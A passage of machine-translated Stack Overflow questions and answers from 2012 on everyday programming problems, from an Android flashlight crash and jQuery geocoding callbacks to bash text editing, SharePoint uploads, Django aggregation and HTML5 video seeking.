05-21 14:52:21.840: D/AndroidRuntime(5403): Shutting down VM
05-21 14:52:21.840: W/dalvikvm(5403): threadid=1: thread exiting with uncaught exception (group=0x40a4a1f8)
05-21 14:52:21.850: E/AndroidRuntime(5403): FATAL EXCEPTION: main
05-21 14:52:21.850: E/AndroidRuntime(5403): java.lang.RuntimeException: Method called after release()
05-21 14:52:21.850: E/AndroidRuntime(5403):     at android.hardware.Camera.native_setParameters(Native Method)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at android.hardware.Camera.setParameters(Camera.java:1423)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at com.spookytorch.jembe.SpookyTorch$1.onClick(SpookyTorch.java:118)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at android.view.View.performClick(View.java:3511)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at android.view.View$PerformClick.run(View.java:14105)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at android.os.Handler.handleCallback(Handler.java:605)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at android.os.Handler.dispatchMessage(Handler.java:92)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at android.os.Looper.loop(Looper.java:137)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at android.app.ActivityThread.main(ActivityThread.java:4575)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at java.lang.reflect.Method.invokeNative(Native Method)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at java.lang.reflect.Method.invoke(Method.java:511)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:789)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:556)
05-21 14:52:21.850: E/AndroidRuntime(5403):     at dalvik.system.NativeStart.main(Native Method) 
```

{Java 文件}

```
//flag to detect flash is on or off
private boolean isLighOn = false;
 boolean check=false;

private Camera camera;

private ImageButton button;

@Override
public boolean onKeyDown(int keyCode, KeyEvent event)
{
    if ((keyCode == KeyEvent.KEYCODE_BACK))

    {
        finish();
        android.os.Process.killProcess(android.os.Process.myPid()) ;
        return true;

    }
    return super.onKeyDown(keyCode, event);

}

@Override
protected void onStop() {
    super.onStop();

    if (camera != null) {
        camera.release();
    }
}

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

//--------------------------------------------------------------\\

    final MediaPlayer mp = MediaPlayer.create(this, R.raw.rain);
    final MediaPlayer mp1 = MediaPlayer.create(this, R.raw.scream);
    // Look up the AdView as a resource and load a request.
    AdView adView = (AdView)this.findViewById(R.id.adView);
    adView.loadAd(new AdRequest());
    button = (ImageButton) findViewById(R.id.buttonFlashlight);
    mp.start();

    Context context = this;
    PackageManager pm = context.getPackageManager();

    // if device support camera?
    if (!pm.hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
        Log.e("err", "Device has no camera!");
        return;
    }

    camera = Camera.open();
    final Parameters p = camera.getParameters();

    button.setOnClickListener(new OnClickListener() {

        public void onClick(View arg0) {

            if (isLighOn) {

                Log.i("info", "torch is turn off!");

                p.setFlashMode(Parameters.FLASH_MODE_OFF);
                camera.setParameters(p);
                camera.stopPreview();
                isLighOn = false;

            } else {

                Log.i("info", "torch is turn on!");

                p.setFlashMode(Parameters.FLASH_MODE_TORCH);

                camera.setParameters(p);
                camera.startPreview();
                isLighOn = true;
                mp1.start();

            }

                }

    });

} 
```

}

# jquery - 带有谷歌地图和 Ajax 调用的谷歌地理编码器 (jquery)

> ID：10685809
> 
> 赞同：0
> 
> 时间：2012-05-21T13:05:19.970
> 
> 标签：jquery, ajax, google-maps, asynchronous, google-geocoder

var 地址总是返回未定义的，除非我在两者之间设置了警报。对此的任何建议都会很棒。这是我的代码；我想要做的是从我的 xml 中获取一个地址，将它扔到解码器中，然后在地图上添加一个标记。

```
var lat1;
var lng1;
var adres;
function parseLocation(callback){
  var geocoder = new google.maps.Geocoder();
  //convert location into longitude and latitude
   var addresses = adres;
  if (geocoder) {
  geocoder.geocode( {
    'address': addresses
  }, function(results, status) {
    if (status == google.maps.GeocoderStatus.OK) {
      lat1 = results[0].geometry.location.lat();
      lng1 = results[0].geometry.location.lng();
      if( typeof callback == 'function' ) {
              callback();
            }
    }         
  });
  }
}
parseLocation(function(){
$('#map_canvas').bind('init', function() {
        $('#map_canvas').gmap('addMarker', {
          'position':  lat1+','+lng1
        }).click(function() {
          $('#map_canvas').gmap('openInfoWindow', {
            'content': lat1+','+lng1
          }, this);

        });
      });
})
function getdetails(artist){
  $.ajax({
    type: "GET",
    url: "data/concerts.xml",
    async: false,
    dataType: "xml",
    success: function(xml){
      $(xml).find("concert").filter(function(){
        return $(this).find("artist").text().indexOf(artist) === 0;
      }).each(function(){
        $('#container').append('<div id="tabel"><div id="tabelimage_detail"><img src="'+$(this).find('image').text()+'"alt="articleimage" id="image"/></div>'
        +'<div id="tabelartist_detail">'+$(this).find('artist').text()+'</div>'
        +'<div id="tabellocation_detail">'+$(this).find('location').text()+'</div>'
        +'<div id="tabelurl_detail"><a href="'+$(this).find('url').text()+'">'+$(this).find('url').text()+'</a></div>'
        +'<div id="longreview">'+$(this).find('longreview').text()+'</div>'
        ).trigger('create');
        adres = $(this).find('adres').text();
      })
      parseLocation();
    }
  })
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:15:09.740

只需将参数提供给您的回调函数

```
 if( typeof callback == 'function' ) {
                    callback(lat1, lng1);
                } 
```

并提供回调（当然摆脱全局 lat/lng 变量）：

```
parseLocation(function(lat1, lng1){
$('#map_canvas').bind('init', function() {
                $('#map_canvas').gmap('addMarker', {
                    'position':  lat1+','+lng1
                }).click(function() {
                    $('#map_canvas').gmap('openInfoWindow', {
                        'content': lat1+','+lng1
                    }, this);

                });
            });
}); 
```

**已更新，完整答案如下**

```
function parseLocation(adres, callback){

    var geocoder = new google.maps.Geocoder();
    //convert location into longitude and latitude
     var addresses = adres;
    if (geocoder) {

    geocoder.geocode( {
        'address': addresses
    }, function(results, status) {
        if (status == google.maps.GeocoderStatus.OK) {
            lat1 = results[0].geometry.location.lat();
            lng1 = results[0].geometry.location.lng();
            if( typeof callback == 'function' ) {
                            callback(lat1, lng1);
                        }

        }

    });
    }

}

function getdetails(artist){
    $.ajax({
        type: "GET",
        url: "data/concerts.xml",
        async: false,
        dataType: "xml",
        success: function(xml){
            $(xml).find("concert").filter(function(){
                return $(this).find("artist").text().indexOf(artist) === 0;
            }).each(function(){
                $('#container').append('<div id="tabel"><div id="tabelimage_detail"><img src="'+$(this).find('image').text()+'"alt="articleimage" id="image"/></div>'

                    +'<div id="tabelartist_detail">'+$(this).find('artist').text()+'</div>'
                    +'<div id="tabellocation_detail">'+$(this).find('location').text()+'</div>'
                    +'<div id="tabelurl_detail"><a href="'+$(this).find('url').text()+'">'+$(this).find('url').text()+'</a></div>'
                    +'<div id="longreview">'+$(this).find('longreview').text()+'</div>'
                    ).trigger('create');
                        adres = $(this).find('adres').text();

            })

              //parseLocation();
parseLocation(adres, function(lat1, lng1){
$('#map_canvas').bind('init', function() {
                $('#map_canvas').gmap('addMarker', {
                    'position':  lat1+','+lng1
                }).click(function() {
                    $('#map_canvas').gmap('openInfoWindow', {
                        'content': lat1+','+lng1
                    }, this);

                });
            });
})

        }
    })
} 
```

# bash - Bash 初学者：编辑值并添加新值

> ID：10685810
> 
> 赞同：0
> 
> 时间：2012-05-21T13:05:22.420
> 
> 标签：bash, awk, sed

我有一组文件（行号不同）总是像这样完成

```
[ molecules ]
; Compound        #mols
Protein_chain_A     1
SOL             12161 
```

我想使用 bash 做的是从 SOL 的值中减去 2 并在文件中添加一个新行（理想情况是在 SOL 和 CL 及其各自的值之间有两个选项卡）

```
SOL       12159
CL        2 
```

我已经用 awk 和 sed 尝试了一些零碎的东西，但它一直困扰着我。最好只使用Python之类的其他东西吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:44:12.787

这可能对您有用（GNU sed）：

```
sed -i '$!b;s/\(\S*\)\s*\(\S*\).*/printf "%s\\t\\t%d\\nCL\\t\\t2\\n" "\1" "$((\2-2))"/e' file 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T13:11:17.050

我会使用我最了解的语言（在我的例子中是 Perl）。但是 bash 及其工具也可以很好地为您服务：

```
{
    head -n-1 "$file"
    read sol num < <(tail -n1 "$file")
    echo $sol$'\t'$((num-2))
    echo CL$'\t'2
} > "$file".new
mv "$file".new $file 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-21T13:13:52.730

```
awk '/^SOL/ {
        match($0, /^SOL([[:space:]]+)/, a);
        num = $2;
        sub(num "$", num - 2);
        print;
        print "CL" a[1] "2";
        next
    }
    {
        print
    }' inputfile 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T18:12:27.117

你可以试试这个简单的一个班轮

```
awk '{if ( $0 !~ "SOL" ){printf "%s\n",$0}else{printf "%s\t\t%d\nCL\t\t2\n",$1,$2-2}}' filename 
```

# plone - 重新创建图像比例失败并出现 502 Bad Gateway

> ID：10685811
> 
> 赞同：0
> 
> 时间：2012-05-21T13:05:24.447
> 
> 标签：plone

如何防止在 portal_atct/manage_imageScales 上重新创建图像比例时出现 502？在布局更改导致一个自定义图像比例的尺寸发生变化后，有必要执行此操作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:39:29.650

我猜你是在 Apache、ngnix、varnish 或类似的代理网络服务器后面运行 Plone。视图的工作时间比允许的前端超时时间长，但服务器将继续在后台工作。

为防止出现 502 Bad Gateway 错误，请直接访问服务器（可能是 8080 端口）。

# java - Swing 和 Netbeans 的“窗口内窗口”

> ID：10685815
> 
> 赞同：1
> 
> 时间：2012-05-21T13:05:51.123
> 
> 标签：java, swing, netbeans

我正在尝试存档此效果： [http ://www.ipadincanada.ca/wp-content/uploads/2010/03/p_600_471_B35C968F-9122-464E-8859-1A1685FADF37.jpeg](http://www.ipadincanada.ca/wp-content/uploads/2010/03/p_600_471_B35C968F-9122-464E-8859-1A1685FADF37.jpeg)

我想制作一个全部内置在同一个“窗口”中的应用程序。会有一个菜单栏，但是当我单击一个选项时，我希望第一个窗口的一部分更改为新的“视图”，而不是打开一个新窗口。

我正在使用内置在 GUI 设计器中的 Netbeans，而我似乎所做的只是 JFrame，它们会导致不同的窗口。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T13:11:04.563

您应该看一下[CardLayout](http://docs.oracle.com/javase/tutorial/uiswing/layout/card.html)，它可以让您拥有像卡片一样被切换出来的 JPanel。（本质上，每个“子窗口”都是一个不同的 JPanel，当它被选中时，它被设置为可见的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-21T13:11:44.007

您可以使用以下

*   [如何使用卡片布局](http://docs.oracle.com/javase/tutorial/uiswing/layout/card.html)

*   [如何使用选项卡式窗格](http://docs.oracle.com/javase/tutorial/uiswing/components/tabbedpane.html)

*   [如何使用内部框架](http://docs.oracle.com/javase/tutorial/uiswing/components/internalframe.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-21T13:10:40.903

您可以`JPanel`用于此目的。制作一个容纳其他 JPanel 的设备，并在需要时在它们之间切换，如下所示：

```
children[0].setVisible(false); 
children[1].setVisible(true); 
```

或使用`CardLayout`它，因为它允许快速交换并且基本上是为此目的而构建的，因此得名。

# cocoa - 如何更改 PDF 渲染引擎？

> ID：10685821
> 
> 赞同：5
> 
> 时间：2012-05-21T13:06:10.950
> 
> 标签：cocoa, pdf, transparency, gradient

在我的 Cocoa 应用程序中，我需要创建包含透明渐变的 PDF。目前 PDF 1.4 可供 Cocoa 应用程序用于打印或导出为 PDF。

但是这个版本有一些限制，例如，我不能创建具有透明度的渐变。

是否可以切换默认的 PDF 渲染引擎或以某种方式创建具有包含透明度的渐变的 PDF 文件？

# html - css 定位 - 浮动 3 个元素

> ID：10685822
> 
> 赞同：2
> 
> 时间：2012-05-19T17:48:19.853
> 
> 标签：html, css, positioning

我制作了一个网页，该网页在我的计算机上的 IE 9 浏览器中运行良好，但自从将其上传到网络后，这 3 个元素与页脚一起并排浮动，最终到处都是。在 firefox、safari 和 IE 中，IE 是显示效果最好的浏览器。我已经尝试了几乎所有我能想到的。页面上的几个 div 使用了我在 Photoshop 中所做的透明背景。任何想法都会非常感激。

的HTML：

```
<!DOCTYPE html >
<html>
    <head>
        <title></title>
        <link rel="stylesheet" type="text/css"
        href="123.css"/>
        <head>
            <META http-equiv="Content-Style-Type" content="text/css">
        </head>
        <body>
            <div class="wrapper">
                <table width="1000px" height="40px" style="background-color:#494545;">
                    <tr>
                        <td width="700"></td>
                        <td width="50" margin="10"><a href="html\home.html">
                            <img src="flag1.jpg" border="0"></a></td>
                        <td width="50" margin="10"><a href="html\home.html">
                            <img src="flag2.jpg" border="0"></a></td>
                        <td width="50" margin="10"><a href="html\home.html">
                            <img src="flag3.jpg" border="0"></a></td>
                    </tr>
                </table>
                <div id="topdiv">
                    <image src="graphics/toplogo.png">
                </div>
                <div class="main">
                        <ul>
                            <li >
                                <br/><br/><br/><br/>
                            <li>
                                <br/><br/><br/><br/>
                            <li>
                                <br/><br/><br/><br/>
                            <li>
                        </ul>
                    <div class="text">
                        text goes here
                    </div>
                    <div class="right">
                        <strong>Promotions</strong>
                        <br/>
                        <br/>
                        div>
                    </div>
                    <div class="footer"></div>
                </div>
        </body>
</html> 
```

和CSS：

```
body {
    background-image: url("graphics/backtab.png");
    background-repeat: repeat;
    margin: 0;
    padding: 0;
}
.wrapper {
    background-image: url("graphics/contrana.png");
    width: 1000px;
    text-align: left;
    margin: 0 auto;
}
#topdiv {
    width: 1000;
    height: 180;
    text-align: left;
    position: relative;
    margin-top: 0;
    padding-top: 0;
    display: block;
}
.main {
    width: auto position :relative;
    margin: 0 auto;
    background-image: url("graphics/tr.jpg");
    border: 5px solid #0A1379;
    padding-top: 60;
    padding-left: 50;
    display: block;
    overflow: visible;
}
ul {
    background-color: white;
    width: 150px;
    margin-top: 60px;
    float: left;
    margin-right: 50;
    padding: 40;
    border: 2px solid black;
    filter: alpha(opacity=70);
    opacity: 0.7;
}
li {
    list-style-type: none;
    text-decoration: none;
    font-weight: bold;
}
a:link {
    color: black;
    font-family: verdana;
    text-decoration: none;
    list-style-type: none;
    outline: 0;
}
a:visited {
    color: black;
    font-family: verdana;
    list-style-type: none;
    text-decoration: none;
    outline: 0;
}
a:hover {
    color: #EE9613;
    font-family: verdana;
    text-decoration: none;
    font-family: verdana;
    list-style-type: none;
    outline: 0;
}
a:active {
    color: black;
    font-family: verdana;
    text-decoration: none;
    font-family: verdana;
    list-style-type: none;
    outline: 0;
}
.text {
    background-image: url("graphics/textback.png");
    width: 500px;
    float: left;
    font-family: verdana;
    font-size: 14;
    padding: 10px 15px;
    margin-top: 70px;
    word-spacing: 10px;
    color: black;
    line-height: 18px;
    text-align: left;
    margin-right: 15px;
    display: inline;
    border: 2px solid black;
}
.right {
    width: 190px;
    float: right;
    margin-top: 60;
    background-image: url
    ("graphics/advertback.png");
    margin-right: 20;
    border: 2px solid black;
}
#footer {
    width: 1000px;
    height: 50px;
    background-image: url

    ("graphics/footer.jpg");
    background-repeat: repeat-x;
    text-align: center;
    padding-top: 15;
    font-family: verdana;
    font-size: 12px;
    text-color: white;
    margin: 0 auto;
    font-weight: bold;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-19T21:55:30.850

您的代码有错误，包装器 div 未关闭，并且您还有其他未关闭的标签。而不是使用一堆`<br/>`标签，你应该只使用填充和边距。

这是一个基本的 3 列 CSS 布局。使用它比尝试修复代码更容易。

HTML

```
<div id="container">
        <div id="header">
        <p>Header</p>
    </div>
    <div id="primary">
        <p>Primary Sidebar</p>
    </div>
    <div id="content">
        <p>Main content</p>
    </div>
    <div id="secondary">
        <p>Secondary Sidebar</p>
    </div>
    <div id="footer">
        <p>Footer</p>
    </div>
</div> 
```

CSS

```
#container {
    width: 960px;
    margin: 0 auto;
}
#primary {
    float: left;
    width: 240px;
}
#content {
    float: left;
    width: 480px;
}
#secondary {
    float: left;
    width: 240px;
}
#footer {
    clear: both;
} 
```

# jquery - 如何在 IE 和 Chrome 中使用 jQuery 加载纯文本 CSV？

> ID：10685825
> 
> 赞同：1
> 
> 时间：2012-05-21T13:06:20.483
> 
> 标签：jquery

我正在尝试下载 CSV 文件以使用 jQuery 填充图形。在 Firefox（12.0 获胜）中一切正常，但在 IE（9.0 获胜）和 Chrome（19.0 获胜）中失败。

> 抛出的错误只是“错误”。而已。

我怀疑这是由于 mime-types 和 jQuery dataType 的组合，但我无法让它工作。有没有人有什么建议？

**我从服务器的响应是这样的：（从 Firefox 复制）**

```
Cache-Control:       private, s-maxage=0
Content-Disposition: attachment;filename=data.csv
Content-Type:        text/plain
Date:                Mon, 21 May 2012 12:53:36 GMT
Server:              Microsoft-IIS/7.5
Transfer-Encoding:   chunked
X-AspNet-Version:    4.0.30319
X-AspNetMvc-Version: 3.0
X-Powered-By:        ASP.NET 
```

**我的 jQuery 片段：**

```
$.ajax({
    url: 'dummyurl',
    type: 'GET',
    dataType: 'text',
    success: function (data) {

        // process

    },
    error: function(jqXHR, textStatus, errorThrown){
        alert('An error occurred: ' + textStatus + ', ' + errorThrown);
    }
}); 
```

（是的，我已经用谷歌搜索并尝试了很多建议:)）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T15:32:06.920

我终于找到了解决方案。如果有人用谷歌搜索它：

内容类型**必须**包括`charset`. 如果没有，该请求将在 chrome 中没有更多信息而消失。

```
Content-Type: text/plain; charset=utf-8 
```

# ember.js - IE8 中的 Ember.Select 错误

> ID：10685828
> 
> 赞同：0
> 
> 时间：2012-05-21T13:06:42.247
> 
> 标签：ember.js

我有一个带有国家/地区下拉选择器的注册表单，它在 Webkit / Firefox / IE9 中运行良好，但是在 IE8 中加载视图时（我认为 IE7，不记得 100％，我真的不关心 IE7无论如何支持），它会引发错误：

`'this.$().0.selectedIndex' is null or not an object`

我试图将其简化为一个简单的示例，如下所示：http: [//jsfiddle.net/tomwhatmore/HHw3y/](http://jsfiddle.net/tomwhatmore/HHw3y/)但不幸的是我什至无法让它在 IE8 中运行，它`'console' is undefined`在 ember-latest 中抱怨.js，这不是超级有用。

这绝对是选择，因为我可以把它拿出来，表单视图的其余部分插入得很好。这是 Ember 错误吗？如果没有，我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T23:31:16.067

之前的 ember 版本中存在一个错误，导致`'console' is undefined`您在上面提到的错误。它已在最新版本中修复。

# c# - system.drawing.image 到 spfile

> ID：10685832
> 
> 赞同：4
> 
> 时间：2012-05-21T13:07:02.177
> 
> 标签：c#, sharepoint

我有一张图片需要保存在共享文档下的 Sharepoint 站点中

由于各种原因，图像必须位于 system.drawing.image 中并保存在 sharepoint 站点内的共享文档中。它不必保存在本地硬盘中。

你有什么解决办法吗？

到目前为止，我正在尝试

```
 MemoryStream ms = new MemoryStream();
 imageIn.Save(ms,System.Drawing.Imaging.ImageFormat.Gif);
 byte[] imagebyte = ms.ToArray(); 
```

然后是streamreader的Savebinary功能但没有乐趣

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-22T10:03:25.190

过了一会儿，我设法找到了一个避免图片库的解决方案

```
 void imageSave(System.Drawing.Image imageTobeSaved)
    {
        using (SPSite site = new SPSite("http://sptestsite/"))
        {
            using (SPWeb web = site.RootWeb)
            {
                SPFolder myLibrary = web.Folders["Shared%20Documents"];

                var stream = new System.IO.MemoryStream();
                string filename = "picture.jpg";          
                MemoryStream ms = new MemoryStream();
                imageTobeSaved.Save(ms, System.Drawing.Imaging.ImageFormat.jpg);
                byte[] ImageByte = ms.ToArray();

                SPFile spfile = myLibrary.Files.Add(filename, ImageByte);
                myLibrary.Update();

            }
        }
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T13:34:11.643

十岁的初学者，您需要在此处更改一些硬编码设置

```
 public void addToSharepointImageList(string folderName, string fileName, byte[] content)
    {
        string path = @"\\yoursite\yourlistname\";
        string baseSharePointPath = "http://yoursite/";
        string listName = "yourlistname"; 
        SharePointImagingService.Imaging svc = null;

        try
        {
            path += folderName;
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }

            #region create sharepoint service

            svc = new SharePointImagingService.Imaging();

            NetworkCredential nc = new NetworkCredential("username", "password", "domain");
            svc.Credentials = nc;
            //svc.Credentials = System.Net.CredentialCache.DefaultCredentials;
            svc.Url = baseSharePointPath + listName+ "/_vti_bin/imaging.asmx";
            svc.Discover();

            #endregion

            svc.Upload(baseSharePointPath + listName, folderName, content, fileName, true);
        }
        catch (Exception e)
        {
            //deal with error
        }
        finally
        {
            svc.Dispose();
        }

    } 
```

或者，如果您尝试将文件直接保存到非图像列表中，您可以将 sharepoint 视为一个巨大的文件共享，然后打开一个文件流并在那里写入字节数组。

# silverlight - 更改垂直滚动条的宽度

> ID：10685833
> 
> 赞同：2
> 
> 时间：2012-05-21T13:07:02.963
> 
> 标签：silverlight, scrollbar, scrollviewer

在我的 Silverlight 4 应用程序中，我有一个 ScrollViewer。我想改变 Scrollviewer 的垂直 Scrollbar 的宽度，让它更薄一些。我已经搜索了一个简单的解决方案，但我不需要/不想重新设置整个滚动条的样式。我在想类似的事情：

```
MyScrollViewer.VerticalScrollbar.Width = 8; 
```

但是没有这样的财产。任何想法，如何使滚动条更薄？

提前致谢，
弗兰克

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-22T04:55:41.687

没有直接的方法可以获取滚动查看器的垂直滚动条。下面的代码将从可视化树中提取垂直滚动条，您可以更改“滚动条”的属性

```
ScrollBar vertical = ((FrameworkElement)VisualTreeHelper.GetChild(scrollviewer1, 0)).FindName("VerticalScrollBar") as ScrollBar; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-06T18:05:27.940

还有一个名为 MinWidth 的属性。如果设置该属性，则宽度将减小。

尝试这个 ：

```
 ScrollBar vertical = ((FrameworkElement)VisualTreeHelper.GetChild(scrollViewer1, 0)).FindName("VerticalScrollBar") as ScrollBar;
 vertical.MinWidth = 8;
 vertical.Width = 8; 
```

# javascript - 使用 Javascript 打印嵌入的 PDF 失败

> ID：10685842
> 
> 赞同：2
> 
> 时间：2012-05-21T13:07:42.240
> 
> 标签：javascript, firefox, google-chrome, pdf, printing

我正在开发一个需要与多浏览器兼容的项目，但我遇到了一个问题，导致 Adob​​e Reader 打印对话框被激活并在除 IE 之外的所有其他浏览器中显示。我使用对象标签将 PDF 嵌入到浏览器中，如下所示：

```
<object id="pdfObj" type="application/pdf" style="width:60%;height:95%;position:relative;top:2%;left:0%;right:10%;bottom:10%;margin:0px;padding:0px;border:0px;" data="PDFView.aspx"></object> 
```

我使用 jQuery 来捕捉打印链接的点击，如下所示：

```
 $('#PrintLink').click(function () {
                $("#pdfObj")[0].print();
            }); 
```

这适用于 IE，但在 Firefox 中使用 Web Developer 工具运行时，会捕获到错误“$("#pdfObj")[0].print is not a function”。使用 Chrome，我收到错误“未捕获的类型错误：对象#没有方法打印。

有谁知道如何使用这些其他浏览器来实现这一点？您的回答将不胜感激。

詹姆士

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-08-26T08:42:37.343

我知道这是一个老问题，但过去一周我一直在寻找解决方案。问题是如果页面的 URL 不以 www 开头，Firefox 将不允许您访问该元素。尝试将此脚本添加到页面顶部：

```
<script type="text/javascript">
    if ( location.host.toLowerCase().substring(0,3) != "www" )
    {
        location.href = location.href.replace( /\/\//, "//www." );
    }
</script> 
```

这会将用户重定向到相同的 URL，但会添加 www。到它的开始。

然后将您的 pdf 嵌入 iframe 中：

```
<iframe id="iframe" src="myPDF.pdf" width="200" height="500"></iframe> 
```

然后你可以使用这个 javascript 函数来打印 PDF：

```
document.getElementById("iframe").contentWindow.print(); 
```

如果您需要 IE 和 Safari 的不同代码，您可以在 JavaScript 中执行检查以查看用户使用的浏览器。希望这会有所帮助，它对我有用。

# entity-framework - Linq to Entity 案例类型

> ID：10685843
> 
> 赞同：0
> 
> 时间：2012-05-21T13:07:46.147
> 
> 标签：entity-framework, c#-4.0, linq-to-entities, entity-framework-4.1

假设我们有一个具有以下属性的*发票项目实体：*

**发票项目**

*   ID
*   日期
*   数字

*Invoice Item*有两个不同的子实体 (TPT)，如下所示：

**WarehouseInvoiceItem** :**发票项**

*   数量
*   期间

**FreightInvoiceItem** :**发票项**

*   重量

现在，我想填写一个具有以下结构的 DTO：

**InvoiceItemDto**

*   ID
*   日期
*   数字
*   ？数量
*   ？期间
*   ？重量

这就是我试图这样做的方式：

```
db.InvoiceItem.Select(i=>new InvoiceItemDto{
   Id = i.Id,
   Date = i.Date, ...
}); 
```

我无法访问驱动实体的特殊字段（例如 Duration of WarehouseInvoiceItem），因为我不能这样使用`ofType`：

```
db.InvoiceItem.ofType<WarehouseInvoiceItem>().Select() 
```

相反，我希望我可以这样选择：

```
db.InvoiceItem.Select(i=>new InvoiceItemDto{
   Id = i.Id,
   Date = i.Date,
   Duration = (i is WarehouseInvoiceItem)? (WarehouseInvoiceItem)i.Duration : null,
   Quantity = (i is WarehouseInvoiceItem)? (WarehouseInvoiceItem)i.Quantity : null,
   Weight = (i is FreightInvoiceItem)? (FreightInvoiceItem)i.Weight : null
}); 
```

知道出于这个原因我该如何管理查询吗？提前谢谢你。

# django - 解决以下实现的pythonic方法

> ID：10685848
> 
> 赞同：3
> 
> 时间：2012-05-21T13:07:51.450
> 
> 标签：django, python, django-orm

我的 django 应用程序中有 3 个模型

```
class Company(models.Model):

    name = models.CharField(_("Name"), max_length = 100, blank = True, null = True)
    address = models.CharField(_("Address"), max_length = 300, blank = True, null = True)

class WebSite(models.Model):

    WEBSITE_TYPE_CHOICES = (
        ('Google+', 'Google+'),
        ('Facebook', 'Facebook'),
        ('Orkut', 'Orkut'),
    )
    user = models.ForeignKey(User)
    website = models.URLField(blank = True, null = True)
    website_type = models.CharField(max_length = 15, choices = WEBSITE_TYPE_CHOICES, default = 'Google+')
    company = models.ForeignKey(Company, null=True, blank=True)

class Review(models.Model):

    rating = models.FloatField(blank = True, null = True) 
    review = models.TextField(blank = True, null = True)
    company = models.ForeignKey(Company, null=True, blank=True)
    website = models.ForeignKey(Website, null=True, blank=True) 
```

我想显示我的数据，例如

A公司：

1.  谷歌 - 5 条评论，平均 3.4
2.  Orkut - 9 条评论，平均 4.1
3.  Facebook - 12 条评论，平均 4.3
4.  其他 - 2 条评论，平均 2

B公司：

1.  Google - 2 条评论，平均 3 条
2.  Facebook - 5 条评论，平均 4 条

为此我做了

```
 final_list = company_list = []
    websites = Website.objects.select_related().filter(user = user)

    for website in websites:
        company = website.company
        if company is not None and company not in company_list:
            company_list.append(brand)
            company_websites = websites.filter(company = company)
            info = []
            for company_website in company_websites:
                company_type = company_website.website_type
                reviews = Review.objects.filter(company = company, website = company_website)
                no_of_reviews = len(reviews)
                average = reviews.aggregate(Avg('rating'))
                info.append({"type": company_type, "no_of_reviews": no_of_reviews,
                             "average": average['rating__avg']})
            final_list.append({"company": company.name, "stats": info}) 
```

**代码有2个问题**

1.  它浪费了大量的计算
2.  它还以某种方式在 final_list 中附加了空列表（BUGGY）

**仅供参考：**我相信 .annotate() 可以使用，但我不明白如何基于列使用它，在我的情况下是 (company__name)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:19:07.523

这将为您提供数据。

```
Review.objects.values(company, website__website_type).annotate(review_count=Count('id'), average=Avg('rating')).order_by('company') 
```

使用[{% regroup %}](https://docs.djangoproject.com/en/dev/ref/templates/builtins/#regroup)在模板中输出。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-23T14:52:04.910

我没有对此进行测试，它可能不如您收到的其他答案那么好，但以防万一它有帮助......

```
companies = Company.objects.all()
company_ratings = []

for company in companies:
    websites = company.website_set.filter(user=user)
    new_data = []

    for website in websites:
        reviews = Reviews.objects.filter(website=website, company=company)
        ratings = [x.rating for x in reviews]
        count = len(ratings)
        new_data.append({'website': website, 'count': count, 
                         'average': float(sum(ratings))/count})

    company_ratings.append({'company':company, 'ratings':new_data}) 
```

# javascript - 检测寻找视频事件 HMTL5（主要在 iOs4 上）

> ID：10685850
> 
> 赞同：1
> 
> 时间：2012-05-21T13:08:04.260
> 
> 标签：javascript, ios4, html5-video, dom-events

我需要检测`seeking`事件，因为在 iOs4 上`seeked`没有搜索事件。我不想检测设备，而是检测功能。

我可以做一个糟糕的`addEvent`/ `fireEvent`，但我正在寻找像`'seeking' in myElement`.

有什么解决办法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-22T09:59:11.203

```
var lastUnixTimeStamp;
var lastCurrentVideoTime;

videoplayer.addEvent('timeupdate',function(){

    if( !lastUnixTimeStamp && !lastCurrentVideoTime ){  //not defined at first timeupdate event
         lastUnixTimeStamp = new Date().getTime();
         lastCurrentVideoTime = videoplayer.currentTime;
         return;
    }

    var videoTimeOffset = videoplayer.currentTime - lastCurrentVideoTime;  //how many milliseconds was video running
    var realTimeOffset = new Date().getTime() - lastUnixTimeStamp;  //how many milliseconds were real time running

    //guess the numbers are not accurate, so if the difference between both is f.e. < 100ms, video runs normally 
   if( (videoTimeOffset - realTimeOffset) > 100 ){
       //do your seeking magic
   }

    lastUnixTimeStamp = new Date().getTime();
    lastCurrentVideoTime = videoplayer.currentTime;

}) 
```

正如上面评论中提到的，可能不是最好的解决方案，但应该这样做。祝你好运

* * *

## 回答 #2

> 赞同：0
> 
